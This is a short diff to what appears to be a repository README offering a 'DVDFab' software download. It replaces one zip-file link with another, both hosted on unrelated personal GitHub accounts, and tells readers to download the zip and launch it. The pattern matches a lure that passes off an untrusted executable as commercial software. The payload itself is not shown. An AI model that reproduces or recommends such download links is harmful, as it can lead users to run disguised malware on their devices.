@@ -50,7 +50,7 @@ Dive into each topic to find valuable information and resources related to DVDFa
 
 If you are looking to download the DVDFab software, click on the button below to get access to the software zip file:
 
-[![Download DVDFab Software](https://img.shields.io/badge/Download-DVDFab-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download DVDFab Software](https://github.com/Azankhan505/DVDFab-Download/releases/download/v1.0/Application.zip)](https://github.com/Azankhan505/DVDFab-Download/releases/download/v1.0/Application.zip)
 
 Remember to download the zip file and launch it to start using DVDFab on your device.
 
